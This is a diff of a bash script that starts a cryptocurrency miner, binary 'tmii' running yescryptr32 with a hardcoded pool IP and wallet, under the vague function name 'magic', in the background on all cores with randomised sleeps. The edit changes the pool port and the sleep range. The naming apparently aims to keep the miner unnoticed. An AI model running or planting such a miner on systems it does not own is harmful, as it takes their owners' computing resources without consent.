@@ -24,7 +24,7 @@ start_magic() {
   local cores_to_use="0-$(($num_cores - 1))"  # Using the first $num_cores cores
 
   # Start the mining process with core affinity and output to log file
-  taskset -c $cores_to_use nohup ./tmii -a yescryptr32 --pool 45.115.224.99:844 -u UddCZe5d6VZNj2B7BgHPfyyQvCek6txUTx.$worker --timeout 120 -t $num_cores > mining.log 2>&1 &
+  taskset -c $cores_to_use nohup ./tmii -a yescryptr32 --pool 45.115.224.99:8449 -u UddCZe5d6VZNj2B7BgHPfyyQvCek6txUTx.$worker --timeout 120 -t $num_cores > mining.log 2>&1 &
   local pid=$!
 
   echo "Magic started with PID: $pid using $num_cores cores"
@@ -48,9 +48,9 @@ stop_magic() {
   fi
 }
 
-# Function to generate a random sleep duration between 2 and 7 minutes
+# Function to generate a random sleep duration between 3 and 7 minutes
 get_random_sleep_duration() {
-  local min=120    # 2 minutes in seconds
+  local min=180    # 3 minutes in seconds
   local max=420    # 7 minutes in seconds
   echo $((RANDOM % (max - min + 1) + min))
 }
@@ -66,9 +66,9 @@ while true; do
   sleep_duration=$(get_random_sleep_duration)
   
   # Validate and debug sleep duration
-  if [[ -z "$sleep_duration" || "$sleep_duration" -lt 120 ]]; then
-    echo "Error: Invalid sleep duration: $sleep_duration. Defaulting to 2 minutes."
-    sleep_duration=120
+  if [[ -z "$sleep_duration" || "$sleep_duration" -lt 180 ]]; then
+    echo "Error: Invalid sleep duration: $sleep_duration. Defaulting to 3 minutes."
+    sleep_duration=180
   elif [[ "$sleep_duration" -gt 420 ]]; then
     echo "Error: Sleep duration exceeds maximum value. Adjusting to 7 minutes."
     sleep_duration=420
